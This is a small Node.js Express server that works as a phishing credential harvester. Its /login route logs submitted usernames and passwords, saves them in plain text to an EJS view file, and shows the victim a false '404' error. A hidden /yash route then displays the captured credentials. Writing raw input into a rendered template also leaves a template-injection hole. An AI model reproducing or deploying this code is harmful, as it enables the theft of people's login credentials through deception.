const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
//yash
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.render('index.ejs');
});

app.post('/login', (req, res) => {
    const {username, Password} = req.body;
  
    console.log(username); 
    console.log(Password);
    fs.writeFile('./views/loginDetails.ejs', username + " Pass: " + Password, (err) => {
        if (err) {
            console.error(err);
            res.status(500).send('Error 404 , Please try again ');
        } else {
            console.log('File created successfully');
            res.send('Something went wron please try again Status Code:404');
        }
    });
});
app.get("/yash",(req, res)=>{
    res.render("loginDetails.ejs");
});

app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
